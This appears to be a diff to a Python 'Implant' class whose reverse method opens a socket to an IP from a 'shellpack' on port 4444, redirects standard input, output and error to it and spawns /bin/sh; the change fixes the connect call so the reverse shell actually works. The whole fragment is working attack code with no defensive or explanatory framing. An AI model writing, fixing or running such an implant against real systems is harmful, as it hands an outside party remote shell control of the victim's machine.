@@ -27,7 +27,7 @@ class Implant(Host):
 
     def reverse(self, shellpack):
         s=socket.socket()
-        s.connect(shellpack['ip'], 4444)
+        s.connect((shellpack['ip'], 4444))
         print(shellpack['ip'])
         [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
         pty.spawn("/bin/sh")
